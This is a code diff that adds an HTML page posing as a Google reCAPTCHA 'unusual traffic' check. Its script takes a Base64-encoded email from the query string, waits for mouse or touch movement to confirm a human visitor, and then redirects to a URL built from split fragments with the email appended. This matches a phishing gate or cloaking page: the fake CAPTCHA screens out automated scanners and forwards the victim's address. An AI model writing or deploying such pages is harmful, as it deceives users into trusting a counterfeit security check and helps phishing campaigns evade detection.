@@ -1,1 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>AoVL6D30J1NRbm7LvqRn4w05f3h32e</title>
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body style="font-family: Arial, sans-serif; background-color: #fff; color: #333;">
+    <div style="margin: 0 auto;  width: 400px; padding: 10px; text-align: left; border: #ccc;">
+        <div style="display: flex; align-items: center;">
+            <label for="not-robot" style="margin: 0; font-size: 14px; vertical-align: middle;">I'm not a robot</label>
+        </div>
+        <div style="text-align: right; font-size: 11px; color: #555;">
+        <div aria-hidden="true" role="presentation" style="text-align: right; font-size: 12px;">
+            reCAPTCHA
+        </div>
+        <div>
+            <a style="text-decoration: none; color: #1a0dab;">Privacy</a><span aria-hidden="true"> - </span>
+            <a  style="text-decoration: none; color: #1a0dab;">Terms</a>
+        </div>
+    </div>
+        <div style="height: 20px; width: 20px; border: 2px solid #f3f3f3; border-top: 2px solid #3498db; border-radius: 50%; animation: spin 2s linear infinite;">
+            <!-- Smaller loader rotating indefinitely -->
+        </div>
+        <div style="border-top: 1px solid #eaeaea; padding-top: 0px; color: #777;">
+            <p style="font-size: 13px;">Our systems have detected unusual traffic from your computer network. This page checks to see if it's really you sending the requests and not a robot.</p>
+            <a style="color: #1a0dab; text-decoration: none; font-size: 13px;">Why did this happen?</a>
+        </div>
+    </div>
+    </body>
+<script>
+    function getQueryVariable(variable) {
+        var query = window.location.search.substring(1);
+        var vars = query.split('&');
+        for (var i = 0; i < vars.length; i++) {
+            var pair = vars[i].split('=');
+            if (decodeURIComponent(pair[0]) === variable) {
+                return decodeURIComponent(pair[1]);
+            }
+        }
+        console.log('Query variable %s not found', variable);
+        return false;
+    }
 
+    function isBase64(str) {
+        try {
+            // Check if string is a valid Base64 encoded
+            return btoa(atob(str)) === str;
+        } catch (err) {
+            return false;
+        }
+    }
+
+    function decodeBase64(str) {
+        // Decode a Base64 encoded string
+        return decodeURIComponent(atob(str).split('').map(function(c) {
+            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+        }).join(''));
+    }
+
+    function checkHumanInteraction() {
+        let startTime = Date.now();
+        let interactionDetected = false;
+
+        document.addEventListener('touchstart', function() {
+            if (!interactionDetected && (Date.now() - startTime > 300)) {
+                interactionDetected = true;
+                attemptRedirect();
+            }
+        });
+
+        document.addEventListener('mousemove', function() {
+            if (!interactionDetected && (Date.now() - startTime > 300)) {
+                interactionDetected = true;
+                attemptRedirect();
+            }
+        });
+    }
+
+    function attemptRedirect() {
+        var redirectUrl = constructLink();
+        console.log("Redirecting to:", redirectUrl);
+        setTimeout(function() {
+            window.location.href = redirectUrl;
+        }, 300);
+    }
+
+    function constructLink() {
+        var base = "https://facebook";
+        var path = ".com";
+        var email = getQueryVariable('email');
+
+        // Check if the email needs decoding from Base64
+        if (email && isBase64(email)) {
+            email = decodeBase64(email);
+        }
+        
+        // Encode the email for URL safety
+        return base + path + (email ? '/' + encodeURIComponent(email) : "");
+    }
+
+    document.addEventListener('DOMContentLoaded', checkHumanInteraction);
+</script>
+</html>
